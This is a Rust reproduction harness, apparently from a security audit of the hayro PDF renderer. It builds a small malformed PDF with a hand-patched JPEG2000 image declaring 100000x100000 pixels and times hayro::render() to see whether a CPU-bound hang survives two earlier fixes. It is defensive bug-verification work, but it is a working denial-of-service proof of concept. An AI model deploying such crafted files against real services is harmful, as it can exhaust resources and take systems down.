// Standalone reproduction for candidate 010, an open question left by candidate 008/009: does
// candidate 008's 100000x100000 malformed-JPEG2000 PoC PDF still hang/thrash for unbounded
// CPU-bound work (distinct from the eager-allocation issue candidate 008's own fix already caps)
// when driven through the real, public, top-level `hayro::render()` entry point, once BOTH
// candidate 008's (`hayro-jpeg2000/src/j2c/decode.rs`, a `MAX_TOTAL_SAMPLE_COUNT` allocation cap)
// and candidate 009's (`hayro/src/image.rs`, the downscale-hint origin-subtraction fix) real
// fixes are applied together?
//
// This drives the exact same 800-byte adversarial PoC PDF used by candidates 008/009 (a
// hand-patched-header, but otherwise real, legitimately-SIZ-marker-parseable JPEG2000 codestream
// embedded as a real `/JPXDecode` image XObject, placed via a real `cm 100 0 0 100 50 50`) through
// the real, unmodified, public `hayro::render()` API - the same function `hayro/examples/render.rs`
// itself calls - with no source instrumentation and no faked participant. The PDF byte stream is
// the genuine external/adversarial input; nothing about the trigger path is hand-simulated.
//
// Exit code convention: 0 and fast = no separate hang (this candidate's suspicion is not
// reproducible), non-zero or the process being killed by the wrapping `timeout` = reproduced.

use hayro::hayro_interpret::InterpreterSettings;
use hayro::hayro_syntax::Pdf;
use hayro::{RenderCache, RenderSettings, render};
use std::time::Instant;

const JP2C: &[u8] = include_bytes!("patched.j2c");

fn build_poc_pdf() -> Vec<u8> {
    let mut img_dict = format!(
        "<< /Type /XObject /Subtype /Image /Width 100000 /Height 100000 \
/BitsPerComponent 8 /ColorSpace /DeviceGray /Filter /JPXDecode /Length {} >>",
        JP2C.len()
    )
    .into_bytes();
    let mut obj4 = Vec::new();
    obj4.append(&mut img_dict);
    obj4.extend_from_slice(b"\nstream\n");
    obj4.extend_from_slice(JP2C);
    obj4.extend_from_slice(b"\nendstream");

    let content: &[u8] = b"q 100 0 0 100 50 50 cm /Im0 Do Q";
    let mut obj5 = format!("<< /Length {} >>\nstream\n", content.len()).into_bytes();
    obj5.extend_from_slice(content);
    obj5.extend_from_slice(b"\nendstream");

    let objs: Vec<Vec<u8>> = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>".to_vec(),
        obj4,
        obj5,
    ];

    let mut out = Vec::new();
    out.extend_from_slice(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");

    let mut offsets = Vec::new();
    for (i, obj) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
        out.extend_from_slice(obj);
        out.extend_from_slice(b"\nendobj\n");
    }

    let xref_offset = out.len();
    let n = objs.len() + 1;
    out.extend_from_slice(format!("xref\n0 {n}\n").as_bytes());
    out.extend_from_slice(b"0000000000 65535 f \n");
    for off in &offsets {
        out.extend_from_slice(format!("{off:010} 00000 n \n").as_bytes());
    }
    out.extend_from_slice(format!("trailer\n<< /Size {n} /Root 1 0 R >>\n").as_bytes());
    out.extend_from_slice(format!("startxref\n{xref_offset}\n%%EOF").as_bytes());

    out
}

fn main() {
    let pdf_bytes = build_poc_pdf();
    println!(
        "built PoC PDF: {} bytes (embedded JPEG2000 codestream: {} bytes, declares \
100000x100000, 2 components, placed via `cm 100 0 0 100 50 50`)",
        pdf_bytes.len(),
        JP2C.len()
    );

    let pdf = Pdf::new(pdf_bytes).expect("PoC PDF should parse");
    let page = &pdf.pages()[0];

    let interpreter_settings = InterpreterSettings::default();
    let render_settings = RenderSettings::default();
    let cache = RenderCache::new();

    println!(
        "calling the real, public hayro::render() (CTM-derived target_dimension hint path) - \
timing it to see whether it completes quickly or hangs/thrashes..."
    );

    let start = Instant::now();
    let pixmap = render(page, &cache, &interpreter_settings, &render_settings);
    let elapsed = start.elapsed();

    println!(
        "render() returned after {:?} (pixmap {}x{})",
        elapsed,
        pixmap.width(),
        pixmap.height()
    );

    if elapsed.as_secs() >= 5 {
        println!("SLOW: took >= 5s - consistent with the suspected separate CPU-bound hang");
    } else {
        println!("FAST: no separate hang observed");
    }
}
